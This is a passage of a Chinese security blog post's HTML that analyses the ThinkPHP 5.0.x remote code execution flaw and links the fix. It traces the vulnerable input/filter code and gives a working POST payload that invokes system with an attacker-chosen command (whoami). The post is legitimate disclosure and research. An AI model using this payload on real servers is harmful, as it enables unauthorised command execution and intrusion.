+<p>所以对<code>input</code>方法而言，其<code>$data</code>即<code>$this-&gt;server</code>数组，其参数<code>name</code>值为<code>REQUEST_METHOD</code>，在<code>input</code>方法源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    $name = (string) $name;</div><div class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</div><div class="line">                $data = $data[$val];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// 无输入数据，返回默认值</span></div><div class="line">                <span class="keyword">return</span> $default;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">       ...</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 解析过滤器</span></div><div class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</div><div class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</div><div class="line">        array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</div><div class="line">        reset($data);</div><div class="line">    &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>因此利用前面的<code>__construct</code>，可以通过传入<code>server[REQUEST_METHOD]=dir</code>，使得在经过<code>foreach</code>循环时置<code>$data</code>值为<code>dir</code>，此后调用<code>getFilter</code>，同样实现RCE:</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/12.jpg?raw=true" alt=""></p>
+<p>给出payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captcha</div><div class="line"></div><div class="line">POST:</div><div class="line"></div><div class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</div></pre></td></tr></table></figure></p>
+<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p>补丁地址:<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="external">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></p>
+<p>问题的根源在于请求方法的获取接收了不可信数据，因此补丁中设置了白名单，如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190113/11.jpg?raw=true" alt=""></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>这里仅仅测试了5.0.22 完整版本。各个版本之间代码有些许差异，payload不一定通用，建议自己调试调试。</p>
+
+      
+  </div>
+    <div>
+      
+        <!-- Google AdSense start -->
+        <!-- test3 -->
+<ins class="adsbygoogle2"
+     style="display:block"
+     data-ad-client="ca-pub-3467872413268634"
+     data-ad-slot="2179835194"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle2 = window.adsbygoogle2 || []).push({});
+</script>
+        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- test -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-3467872413268634"
+     data-ad-slot="5815348948"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+        <!-- Google AdSense end -->
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
+    <div id="QR" style="display: block;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/wechat.png" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/alipay.jpg?raw=true" alt="chybeta Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2019年01月13日 - 09:01</p>
+  <p><span>最后更新:</span>2019年01月13日 - 23:01</p>
+  <p><span>原始链接:</span><a href="/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/" title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析">http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2019/01/13/ThinkPHP-5-0-0-5-0-23-RCE-漏洞分析/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/命令执行/" rel="tag"># 命令执行</a>
+          
+            <a href="/tags/thinkphp/" rel="tag"># thinkphp</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/04/WAScan源码阅读/" rel="next" title="WAScan源码阅读">
+                <i class="fa fa-chevron-left"></i> WAScan源码阅读
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/01/06/Security-Weekly/" rel="prev" title="Security Weekly">
+                Security Weekly <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">190</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">108</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.lzhtony.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://findneo.github.io/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://cltheorem.github.io/" title="cltheorem" target="_blank">cltheorem</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/frankscode/" title="Frank" target="_blank">Frank</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析之POC-1"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析之POC 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#扩展之POC-2"><span class="nav-number">3.</span> <span class="nav-text">扩展之POC 2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁分析"><span class="nav-number">4.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#其他"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
